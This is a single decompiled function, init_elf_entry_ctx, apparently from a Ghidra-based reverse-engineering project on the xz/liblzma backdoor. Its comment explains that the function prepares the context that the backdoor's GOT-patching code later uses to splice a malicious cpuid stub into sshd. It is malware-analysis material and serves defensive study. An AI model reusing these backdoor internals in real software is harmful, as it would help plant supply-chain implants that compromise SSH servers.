// /home/kali/xzre-ghidra/xzregh/104030_init_elf_entry_ctx.c
// Function: init_elf_entry_ctx @ 0x104030
// Calling convention: unknown
// Prototype: undefined init_elf_entry_ctx(void)


/*
 * AutoDoc: Seeds an `elf_entry_ctx_t` prior to running the IFUNC resolvers. It records the address of `cpuid_random_symbol`, captures the caller's return address from the saved frame (slot 3), recomputes the GOT offset via `update_got_offset`, primes the cpuid GOT index with `update_cpuid_got_index`, and clears the cached `got_ptr` so the resolver will refill it. The context is later consumed by the GOT patching code that splices the malicious cpuid stub into sshd.
 */
#include "xzre_types.h"


void init_elf_entry_ctx(undefined8 *param_1)

{
  *param_1 = &_Lrc_read_destroy;
  param_1[2] = *(undefined8 *)(param_1[5] + 0x18);
  update_got_offset();
  update_cpuid_got_index();
  param_1[1] = 0;
  return;
}

